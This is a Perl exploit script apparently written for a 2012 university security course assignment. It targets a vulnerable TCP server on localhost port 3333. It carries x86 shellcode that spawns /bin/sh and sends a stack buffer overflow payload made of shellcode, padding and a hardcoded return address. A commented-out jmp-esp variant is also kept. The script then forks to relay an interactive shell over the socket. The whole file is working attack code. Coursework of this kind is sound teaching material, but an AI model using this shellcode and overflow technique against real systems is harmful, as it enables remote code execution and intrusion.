#--------------------------------------------
# Name: Josh Bundt
# Class: CS4678
# Assignment 4
# File: exploit.pl
# Last modified: 27 Jan 2012
#--------------------------------------------
#
#!/usr/bin/perl


$shellcode =  "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89" .
		"\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80";



use IO::Socket; 
my $sock = new IO::Socket::INET ( 
	PeerAddr => '127.0.0.1', 
	PeerPort => '3333', 
	Proto => 'tcp', 
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

# read data from server
$data = <$sock>;
print "$data";
print "\t *** CONTINUE? ";
$data = <>;
$data = <$sock>;
print "$data";
# send exploit
print "\t *** Sending exploit to server\n";

# location depends on stack (aslr, env)
print $sock "$shellcode" . "A"x260 . "\x90\xf5\xff\xbf\n";

# location used jmp esp in ld-2.13.so (null byte ok) base @ 0x110000
# print $sock "A"x284 . "\x3d\xda\x82\x00" . "$shellcode" . "\n";

#read data from server

# split the program into two processes, identical twins
die "can't fork: $!" unless defined($kidpid = fork());

# the if{} block runs only in the parent process
if ($kidpid) {
	# copy the socket to standard output
	while (defined ($line = <$sock>)) {
	    print STDOUT $line;
	}
	kill("TERM", $kidpid);                  # send SIGTERM to child
}
# the else{} block runs only in the child process
else {
	# copy standard input to the socket
	while (defined ($line = <STDIN>)) {
	    print $sock $line;
	}
}

close($sock);

